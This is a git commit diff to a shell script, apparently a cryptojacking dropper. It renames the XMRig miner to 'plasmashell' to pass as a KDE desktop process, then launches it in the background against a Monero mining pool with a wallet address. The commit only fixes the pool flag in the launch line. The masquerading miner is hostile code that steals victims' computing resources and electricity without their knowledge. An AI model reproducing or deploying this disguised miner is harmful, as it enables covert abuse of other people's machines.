0871487f8d759db19b7dd432be13021a207c949e
hakumlk <ivanko12240@gmail.com>
2026-04-09 20:09:53 +0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -10,4 +10,4 @@ mv xmrig-6.26.0 1
 cd 1
 mv xmrig plasmashell
 chmod +x plasmashell
-./plasmashell -0 pool.hashvault.pro:443 -u 85WG1D3CVTYKPTxE4kQdHFJgghnHGqeiVKPnS8SzX6d9bZs8GyASnuZWRhQB14YTi2YiakQWh4QLjSJ1roqEBhbC17SDis3 --tls -tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -p $hostname -B &
+./plasmashell -o pool.hashvault.pro:443 -u 85WG1D3CVTYKPTxE4kQdHFJgghnHGqeiVKPnS8SzX6d9bZs8GyASnuZWRhQB14YTi2YiakQWh4QLjSJ1roqEBhbC17SDis3 --tls -tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -p $hostname -B &
